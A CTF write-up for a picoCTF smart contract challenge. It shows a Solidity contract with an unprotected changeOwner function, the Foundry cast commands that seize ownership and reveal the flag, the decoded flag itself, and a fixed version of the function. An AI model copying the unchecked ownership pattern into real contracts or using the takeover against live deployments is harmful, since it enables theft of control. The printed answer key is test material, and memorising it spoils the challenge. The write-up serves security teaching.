

# picoCTF 2026 Smart Contract Challenge Writeup

## Challenge: Access Control 
Challenge Link : https://play.picoctf.org/events/79/challenges/723?category=37&page=1
---

# 1. Introduction

This challenge involves interacting with a **Solidity smart contract** deployed on an Ethereum-like blockchain. The goal is to analyze the contract, identify a vulnerability, exploit it, and retrieve the hidden flag.

Smart contract security is an important area in cybersecurity because vulnerabilities in blockchain programs can allow attackers to steal funds or gain unauthorized access.

In this challenge, we exploit a **Broken Access Control vulnerability**.

---

# 2. Given Smart Contract

The challenge provides the following contract:

```solidity
pragma solidity ^0.8.0;

contract AccessControl {
    address public owner;
    string private flag;
    
    bool public revealed;

    event OwnerChanged(address indexed oldOwner, address indexed newOwner);
    event FlagRevealed(string flag);

    constructor(string memory _flag) {
        owner = msg.sender;
        flag = _flag;
        revealed = false;
    }

    function changeOwner(address _newOwner) public {
        address oldOwner = owner;
        owner = _newOwner;
        emit OwnerChanged(oldOwner, _newOwner);
    }

    function solve() public {
        require(msg.sender == owner, "Only the owner can get the flag.");
        
        if (!revealed) {
            revealed = true;
            emit FlagRevealed(flag);
        }
    }

    function getFlag() public view returns (string memory) {
        require(revealed, "Challenge not yet solved!");
        return flag;
    }
}
```

---

# 3. Understanding the Contract

The contract contains three important variables:

* **owner** → the current contract owner
* **flag** → the secret flag (private variable)
* **revealed** → determines if the flag can be accessed

Important functions:

### changeOwner()

```solidity
function changeOwner(address _newOwner) public
```

This function changes the contract owner.

### solve()

```solidity
require(msg.sender == owner)
```

Only the **owner** can call this function to reveal the flag.

### getFlag()

Returns the flag after it has been revealed.

---

# 4. Identifying the Vulnerability

The vulnerability is in this function:

```solidity
function changeOwner(address _newOwner) public
```

The function is **public and has no access control**.

Normally, ownership-changing functions should include a check like this:

```solidity
require(msg.sender == owner);
```

But this contract does **not check who calls the function**.

This means **any user can become the owner**.

This is called a **Broken Access Control vulnerability**.

---

# 5. Exploitation Strategy

To solve the challenge we:

1. Become the contract owner
2. Call the `solve()` function
3. Retrieve the flag

Steps:

```
changeOwner(attacker_address)
solve()
```

---

# 6. Connecting to the Blockchain Node

The challenge provides an Ethereum RPC node:

```
http://lonely-island.picoctf.net:<port>
```

We use the **Foundry tool `cast`** to interact with the contract.

---

# 7. Step 1 — Become the Owner

Command used:

```
cast send <contract_address> \
"changeOwner(address)" <your_address> \
--private-key <private_key> \
--rpc-url <rpc_url> \
--gas-limit 100000
```

After executing this command, the transaction log shows:

```
OwnerChanged(oldOwner, newOwner)
```

This confirms that our address is now the contract owner.

---

# 8. Step 2 — Call solve()

Now that we are the owner, we call:

```
cast send <contract_address> \
"solve()" \
--private-key <private_key> \
--rpc-url <rpc_url> \
--gas-limit 100000
```

This triggers the event:

```
FlagRevealed(flag)
```

---

# 9. Extracting the Flag

The flag appears in the **transaction logs** as hexadecimal data.

Example from the log:

```
7069636f4354467b695f63346e5f62335f30776e33725f37363838303638367d
```

When decoded from **hex → ASCII**, it becomes:

```
picoCTF{i_c4n_b3_0wn3r_76880686}
```

---

# 10. Final Flag

```
picoCTF{i_c4n_b3_0wn3r_76880686}
```

---

# 11. Security Lesson

This challenge demonstrates a common smart contract vulnerability:

## Broken Access Control

The function:

```
changeOwner(address)
```

should only be accessible by the current owner.

A secure implementation would be:

```solidity
function changeOwner(address _newOwner) public {
    require(msg.sender == owner, "Only owner can change ownership");
    owner = _newOwner;
}
```

Without this check, attackers can **take control of the contract**.

---

# 12. Key Takeaways

* Always implement **access control checks** in smart contracts.
* Events can leak sensitive information such as flags.
* Blockchain transactions are **public and permanent**, so mistakes can be exploited easily.
* Security auditing is essential before deploying smart contracts.

---

# 13. Conclusion

In this challenge, we exploited a missing access control check to take ownership of the contract. Once we became the owner, we executed the `solve()` function to reveal the flag through a blockchain event log.

This is a classic beginner smart contract vulnerability and an important concept in blockchain security.

---

